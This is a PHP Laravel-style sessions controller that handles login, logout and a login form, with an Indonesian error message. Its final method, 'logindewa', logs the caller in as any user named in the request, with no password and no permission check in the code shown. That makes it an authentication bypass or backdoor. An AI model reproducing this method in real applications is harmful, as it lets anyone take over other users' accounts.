<?php

use Acme\Forms\LoginForm;

class SessionsController extends BaseController {

	/**
	 * @var Acme\Forms\LoginForm
	 */
	protected $loginForm;

	/**
	 * @param LoginForm $loginForm
	 */
	function __construct(LoginForm $loginForm)
	{
		$this->loginForm = $loginForm;
	}

	/**
	 * Show the form for creating a new resource.
	 *
	 * @return Response
	 */
	public function create()
	{
		return View::make('sessions.create');
	}

	/**
	 * Store a newly created resource in storage.
	 *
	 * @return Response
	 */
	public function store()
	{
		$this->loginForm->validate($input = Input::only('email', 'password'));
		$remember = (Input::has('remember')) ? true : false;
		$uji = array_merge($input, ['active' => 1]);

		if (Auth::attempt($uji, $remember))
		{
			return Redirect::intended('/');
		}

		return Redirect::back()->withInput()->withFlashMessage('Data yang Anda masukan salah atau belum terdaftar atau belum diaktifkan oleh Admin.');
	}

	/**
	 * Remove the specified resource from storage.
	 *
	 * @param  int  $id
	 * @return Response
	 */
	public function destroy($id = null)
	{
		Auth::logout();

		return Redirect::home();
	}

	public function logindewa($id = null)
	{
		Auth::logout();

		$id = User::where('username', Input::get('username'))->first()->id;

		Auth::loginUsingId($id);

		return Redirect::home();
	}

}
